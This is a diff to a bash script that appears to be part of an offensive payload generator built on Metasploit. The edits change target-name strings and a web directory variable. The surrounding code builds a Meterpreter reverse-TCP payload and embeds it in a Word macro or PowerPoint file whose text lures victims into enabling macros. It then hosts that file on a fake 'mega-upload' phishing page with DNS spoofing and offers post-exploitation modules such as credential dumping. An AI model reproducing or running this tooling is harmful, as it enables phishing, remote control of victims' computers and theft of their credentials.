@@ -4569,11 +4541,11 @@ echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
-Targ=$(zenity --list --title "☠ CHOSE TARGET SYSTEM ☠" --text "chose target system .." --radiolist --column "Pick" --column "Option" TRUE "windows" FALSE "mac osx" --width 305 --height 100) > /dev/null 2>&1
+Targ=$(zenity --list --title "☠ CHOSE TARGET SYSTEM ☠" --text "chose target system .." --radiolist --column "Pick" --column "Option" TRUE "WINDOWS" FALSE "MAC OSx" --width 305 --height 100) > /dev/null 2>&1
 
 
   # config rigth arch (payload+format)
-  if [ "$Targ" = "windows" ]; then
+  if [ "$Targ" = "WINDOWS" ]; then
     taa="0"
     orm="C"
     paa="windows/meterpreter/reverse_tcp"
@@ -4625,7 +4597,7 @@ cat << !
 
 
 # building template (windows systems)
-if [ "$Targ" = "windows" ]; then
+if [ "$Targ" = "WINDOWS" ]; then
 echo "[☠] editing/backup files .."
 cp $IPATH/templates/astrobaby.c $IPATH/templates/astrobaby[bk].c > /dev/nul 2>&1
 cd $IPATH/templates
@@ -4650,7 +4622,7 @@ fi
 # use metasploit to build shellcode
 echo "[☠] Generating MS_word document .."
 sleep 2
-if [ "$Targ" = "windows" ]; then
+if [ "$Targ" = "WINDOWS" ]; then
 xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/multi/fileformat/office_word_macro; set EXE::Custom $IPATH/output/$N4m.exe; set BODY Please enable the Macro SECURITY WARNING in order to view the contents of the document; set target $taa; set PAYLOAD $paa; set LHOST $lhost; run; exit -y'" > /dev/null 2>&1
 else
 xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/multi/fileformat/office_word_macro; set BODY Please enable the Macro SECURITY WARNING in order to view the contents of the document; set target $taa; set PAYLOAD $paa; set LHOST $lhost; run; exit -y'" > /dev/null 2>&1
@@ -4677,7 +4649,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
    else
 
 
-if [ "$Targ" = "windows" ]; then
+if [ "$Targ" = "WINDOWS" ]; then
 P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 290) > /dev/null 2>&1
 else
 P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 220) > /dev/null 2>&1
@@ -4697,8 +4669,8 @@ fi
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.docm|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.docm $D3F/$N4m.docm
+        sed "s|NaM3|$N4m.docm|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.docm $ApAcHe/$N4m.docm
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -4730,8 +4702,7 @@ mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/$N4m.exe > /dev/null 2>&1
 rm $ApAcHe/$N4m.docm > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.docm > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -4829,8 +4800,8 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.ppsx|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.ppsx $D3F/$N4m.ppsx
+        sed "s|NaM3|$N4m.ppsx|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.ppsx $ApAcHe/$N4m.ppsx
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -4860,8 +4831,7 @@ echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.ppsx > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.ppsx > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -5127,6 +5097,7 @@ else
 /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 fi
 
+rm $IPATH/templates/hta_attack/index[bak].html > /dev/null 2>&1
 cd $IPATH
 cd ..
 sudo chown -hR $user shell > /dev/null 2>&1
@@ -5221,3 +5192,4 @@ E) sh_exit ;;
 *) echo "\"$choice\": is not a valid Option"; sleep 2 ;;
 esac
 done
+
